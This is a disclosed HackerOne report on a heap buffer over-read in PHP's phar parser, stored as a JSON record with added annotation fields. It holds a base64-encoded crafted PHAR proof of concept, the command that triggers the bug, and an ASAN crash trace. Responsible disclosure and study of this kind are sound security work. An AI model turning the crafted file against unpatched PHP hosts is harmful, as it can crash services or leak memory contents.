{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "cy1337 ",
  "title": "Heap Buffer Overflow (READ: 4) in phar_parse_pharfile",
  "content": "\nPhar files with __HALT_COMPILER(); in unexpected places can lead to a buffer overrun. This is something I found while fuzzing with AFL using an ASAN instrumented PHP.\nThe issue can be observed by disabling the ZEND allocator and using ASAN (or valgrind/etc?) with a crafted phar as input. I have prepared an example PHAR file php-oob4.phar\nCode 98 Bytes\n1USE_ZEND_ALLOC=0 php -d phar.readonly=0 -r \"var_dump(new Phar('php-oob4.phar',0,'project.phar'));\"\nBase64 encoding of php-oob4.phar is as follows:\nCode 68 Bytes\n1X19IQUxUX0NPTVBJTEVSKCk7CgAAANQpRbJAlS4oDzkKFD1B2bK4fX3DAgAAAEdCTUI=\nOUTPUT\nThe following ASAN report was generated from this test case:\nCode 4.31 KiB\n1=================================================================\n2==2741==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000ab7a at pc 0x0000013258a7 bp 0x7ffd845ab330 sp 0x7ffd845ab328\n3READ of size 4 at 0x60200000ab7a thread T0\n4    #0 0x13258a6 in phar_parse_pharfile /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:973:2\n5    #1 0x13258a6 in phar_open_from_fp /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1708\n6    #2 0x131a6c1 in phar_create_or_parse_filename /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1343:7\n7    #3 0x1318503 in phar_open_or_create_filename /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1316:9\n8    #4 0x1341705 in zim_Phar___construct /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar_object.c:1195:6\n9    #5 0x1dc6cbb in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:907:4\n10    #6 0x1c15505 in execute_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:59739:7\n11    #7 0x1c15f56 in zend_execute /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:63776:2\n12    #8 0x1a07225 in zend_eval_stringl /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_execute_API.c:1083:4\n13    #9 0x1a07d6a in zend_eval_stringl_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_execute_API.c:1124:11\n14    #10 0x1a07d6a in zend_eval_string_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_execute_API.c:1135\n15    #11 0x200c501 in do_cli /home/cyoung/php-fuzzing/php-src-php-7.2.12/sapi/cli/php_cli.c:1042:8\n16    #12 0x200960c in main /home/cyoung/php-fuzzing/php-src-php-7.2.12/sapi/cli/php_cli.c:1404:18\n17    #13 0x7f21462e082f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291\n18    #14 0x43a598 in _start (/home/cyoung/php-fuzzing/php-src-php-7.2.12/sapi/cli/php+0x43a598)\n19\n200x60200000ab7a is located 0 bytes to the right of 10-byte region [0x60200000ab70,0x60200000ab7a)\n21allocated by thread T0 here:\n22    #0 0x4da6c8 in __interceptor_malloc (/home/cyoung/php-fuzzing/php-src-php-7.2.12/sapi/cli/php+0x4da6c8)\n23    #1 0x192899c in __zend_malloc /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_alloc.c:2829:14\n24    #2 0x131a6c1 in phar_create_or_parse_filename /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1343:7\n25    #3 0x1318503 in phar_open_or_create_filename /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1316:9\n26    #4 0x1341705 in zim_Phar___construct /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar_object.c:1195:6\n27    #5 0x1dc6cbb in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:907:4\n28    #6 0x1c15505 in execute_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:59739:7\n29\n30SUMMARY: AddressSanitizer: heap-buffer-overflow /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:973:2 in phar_parse_pharfile\n31Shadow bytes around the buggy address:\n32  0x0c047fff9510: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n33  0x0c047fff9520: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n34  0x0c047fff9530: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n35  0x0c047fff9540: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n36  0x0c047fff9550: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n37=>0x0c047fff9560: fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00[02]\n38  0x0c047fff9570: fa fa fd fa fa fa fd fa fa fa fd fa fa fa 02 fa\n39  0x0c047fff9580: fa fa fd fa fa fa 00 00 fa fa 00 fa fa fa 00 05\n40  0x0c047fff9590: fa fa fd fa fa fa 00 05 fa fa fd fa fa fa 00 04\n41  0x0c047fff95a0: fa fa fd fa fa fa 00 fa fa fa fd fd fa fa fd fd\n42  0x0c047fff95b0: fa fa fd fd fa fa fd fd fa fa fd fa fa fa 00 fa\n43Shadow byte legend (one shadow byte represents 8 application bytes):\n44  Addressable:           00\n45  Partially addressable: 01 02 03 04 05 06 07\n46  Heap left redzone:       fa\n47  Heap right redzone:      fb\n48  Freed heap region:       fd\n49  Stack left redzone:      f1\n50  Stack mid redzone:       f2\n51  Stack right redzone:     f3\n52  Stack partial redzone:   f4\n53  Stack after return:      f5\n54  Stack use after scope:   f8\n55  Global redzone:          f9\n56  Global init order:       f6\n57  Poisoned by user:        f7\n58  Container overflow:      fc\n59  Array cookie:            ac\n60  Intra object redzone:    bb\n61  ASan internal:           fe\n62  Left alloca redzone:     ca\n63  Right alloca redzone:    cb\n64==2741==ABORTING\nImpact\nA context dependent attacker can trigger unsafe memory access. This may reveal information, affect availability, or be used as part of an exploit chain.\nThis was tracked as PHP bug 77143\nPHP released fixes for supported affected versions on December 6 2018 as noted in their changelog.\n\n",
  "severity": [
    7.5,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Buffer Over-read"
  ],
  "screenshots": {},
  "disclosed_date": 1602306000,
  "report_url": "https://hackerone.com/reports/477344",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a crafted PHAR file with '__HALT_COMPILER();' in an unexpected location (example provided in base64 encoded php-oob4.phar)"
    ],
    [
      2,
      "Execute the PHAR file with ASAN instrumentation and ZEND allocator disabled: USE_ZEND_ALLOC=0 php -d phar.readonly=0 -r \"var_dump(new Phar('php-oob4.phar',0,'project.phar'));\""
    ]
  ],
  "vuln_description": "A heap buffer overflow vulnerability in PHP's phar extension when parsing PHAR files containing '__HALT_COMPILER();' in unexpected locations. This allows reading 4 bytes past an allocated buffer, potentially leading to information disclosure or availability impacts.",
  "reason": "The vulnerability requires understanding PHAR file structure and the parser's behavior, but the core issue is straightforward buffer boundary checking. The fuzzing approach used to discover it is standard for memory corruption bugs.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}